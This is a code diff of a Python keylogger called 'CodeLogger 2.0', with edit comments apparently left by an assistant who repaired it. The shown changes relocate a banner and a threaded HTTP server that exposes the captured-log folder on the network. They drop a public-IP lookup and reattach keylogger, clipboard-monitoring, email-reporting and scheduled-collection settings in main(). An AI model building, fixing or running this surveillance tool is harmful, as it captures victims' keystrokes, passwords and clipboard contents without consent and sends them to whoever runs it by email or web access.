@@ -13,7 +13,6 @@ import logging
 import threading
 import base64
 import smtplib
-import urllib.request  # <-- ADDED FOR PUBLIC IP
 from datetime import datetime
 from pathlib import Path
 from typing import Any, Dict, List
@@ -33,7 +32,36 @@ from email.mime.multipart import MIMEMultipart
 from email import encoders
 
 # ============================
-# ASCII Banner & Helper Functions
+# ASCII Banner Function
+# ============================
+def print_banner() -> None:
+    banner = r"""
+   _____          _      _
+  / ____|        | |    | |
+ | |     ___   __| | ___| |     ___   __ _  __ _  ___ _ __
+ | |    / _ \ / _` |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|
+ | |___| (_) | (_| |  __/ |___| (_) | (_| | (_| |  __/ |
+  \_____\___/ \__,_|\___|______\___/ \__, |\__, |\___|_|
+                                       __/ | __/ |
+                                      |___/ |___/        v2.0
+    """
+    # Clear terminal (cross-platform)
+    if platform.system() == "Windows":
+        os.system('cls')
+        os.system('color 0A')
+    else:
+        os.system('clear')
+
+    print(banner)
+    print("=" * 60)
+
+# ============================
+# Web Server Function
+# ============================
+
+
+# ============================
+# Logger Class
 # ============================
 class Logger:
     """Simple logger using Python's logging module."""
@@ -66,87 +94,6 @@ class Logger:
 
     def debug(self, message: str) -> None:
         self.logger.debug(message)
-
-def print_banner() -> None:
-    banner = r"""
-   _____          _      _
-  / ____|        | |    | |
- | |     ___   __| | ___| |     ___   __ _  __ _  ___ _ __
- | |    / _ \ / _` |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|
- | |___| (_) | (_| |  __/ |___| (_) | (_| | (_| |  __/ |
-  \_____\___/ \__,_|\___|______\___/ \__, |\__, |\___|_|
-                                       __/ | __/ |
-                                      |___/ |___/        v2.0
-    """
-    # Clear terminal (cross-platform)
-    if platform.system() == "Windows":
-        os.system('cls')
-        os.system('color 0A')
-    else:
-        os.system('clear')
-
-    print(banner)
-    print("=" * 60)
-
-def get_public_ip() -> str:
-    """Fetches the public IP address from an external service."""
-    try:
-        # Use a reliable external service to get the public IP with a timeout
-        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
-            ip = response.read().decode('utf-8').strip()
-            return ip
-    except Exception as e:
-        # This can fail due to no internet, DNS issues, or the service being down
-        print(f"\n[!] Warning: Could not fetch public IP address. Error: {e}")
-        return ""
-
-# ============================
-# Web Server Function
-# ============================
-def start_web_server(directory: str, port: int, logger: Logger) -> None:
-    """
-    Starts a simple, non-blocking HTTP server in a new thread
-    to serve files from the specified directory.
-    """
-    class Handler(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory=directory, **kwargs)
-
-    try:
-        httpd = socketserver.TCPServer(("", port), Handler)
-
-        # --- MODIFIED SECTION: GET PUBLIC AND LOCAL IP ---
-        public_ip = get_public_ip()
-        local_ip = "127.0.0.1"  # Default fallback
-        try:
-            # Get local IP for local network access
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
-        except Exception:
-            pass  # Keep local_ip as 127.0.0.1 if detection fails
-
-        logger.info(f"Starting HTTP server for '{directory}' on port {port}.")
-        print(f"\n[+] Hosting output folder. Access logs at:")
-        print(f"    - Local Access:   http://{local_ip}:{port}")
-        if public_ip:
-            print(f"    - Public Access:  http://{public_ip}:{port}")
-            print(f"      (Note: This requires port forwarding on your router for port {port})")
-        else:
-            print(f"    - Public access URL could not be determined.")
-        # --- END OF MODIFIED SECTION ---
-
-        httpd.serve_forever()
-    except OSError as e:
-        logger.error(f"Could not start web server on port {port}: {e}. The port might be in use.")
-        print(f"\n[!] Error: Could not start web server on port {port}. It may already be in use.")
-    except Exception as e:
-        logger.error(f"An unexpected error occurred in the web server: {e}")
-
-# ============================
-# Logger Class
-# ============================
 
 
 # ============================
@@ -299,6 +246,38 @@ class EmailReporter:
 # ============================
 # System Monitor Class
 # ============================
+def start_web_server(directory: str, port: int, logger: Logger) -> None:
+    """
+    Starts a simple, non-blocking HTTP server in a new thread
+    to serve files from the specified directory.
+    """
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=directory, **kwargs)
+
+    try:
+        httpd = socketserver.TCPServer(("", port), Handler)
+
+        # Get local IP for a user-friendly message
+        try:
+            # Connect to an external host to find the primary local IP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip_address = s.getsockname()[0]
+            s.close()
+        except Exception:
+            ip_address = "127.0.0.1" # Fallback to localhost
+
+        logger.info(f"Starting HTTP server for '{directory}' on port {port}.")
+        print(f"\n[+] Hosting output folder. Access logs at: http://{ip_address}:{port}")
+
+        httpd.serve_forever()
+    except OSError as e:
+        logger.error(f"Could not start web server on port {port}: {e}. The port might be in use.")
+        print(f"\n[!] Error: Could not start web server on port {port}. It may already be in use.")
+    except Exception as e:
+        logger.error(f"An unexpected error occurred in the web server: {e}")
+
 class SystemMonitor:
     """Gathers and saves basic system information."""
 
@@ -819,8 +798,12 @@ def main() -> None:
         print(f"✓ Email configuration: {'Enabled' if config.get('email.enabled') else 'Disabled'}")
         sys.exit(0)
 
+    # ==========================================================
+    # START OF CORRECTED SECTION
+    # ==========================================================
     # Start the web server if a port is specified
     if args.get("host"):
+        # This block is now correctly placed and indented
         port = args.get("host")
         output_dir = config.get("output_dir", "output")
 
@@ -831,6 +814,9 @@ def main() -> None:
             daemon=True
         )
         server_thread.start()
+    # ==========================================================
+    # END OF CORRECTED SECTION
+    # ==========================================================
 
     # Start clipboard monitoring if enabled
     if config.get("features.clipboard_monitoring", True):
@@ -840,7 +826,7 @@ def main() -> None:
         logger.info("Clipboard monitoring is disabled.")
 
     # Set up scheduled tasks
-    interval = config.get("schedule.interval_minutes", 2)
+    interval = config.get("schedule.interval_minutes", 2) # I've reset this to 2, as in the original code
     schedule.every(interval).minutes.do(
         scheduled_tasks,
         keylogger=keylogger,
@@ -874,6 +860,7 @@ def main() -> None:
     print(f"✓ System info collection: {'Enabled' if config.get('features.system_info', True) else 'Disabled'}")
     print(f"✓ Email reporting: {'Enabled' if config.get('email.enabled', False) else 'Disabled'}")
     print(f"✓ Encryption: {'Enabled' if config.get('encryption.enabled', True) else 'Disabled'}")
+    # ADDED THIS LINE BACK
     print(f"✓ Web server for output: {'Enabled on port ' + str(args.get('host')) if args.get('host') else 'Disabled'}")
     print(f"✓ Reporting interval: Every {interval} minutes")
     print("=" * 60)
@@ -889,5 +876,6 @@ def main() -> None:
         print("\nThank you for using CodeLogger 2.0!")
         sys.exit(0)
 
+# Add the entry point to call main() when the script is executed directly
 if __name__ == "__main__":
     main()
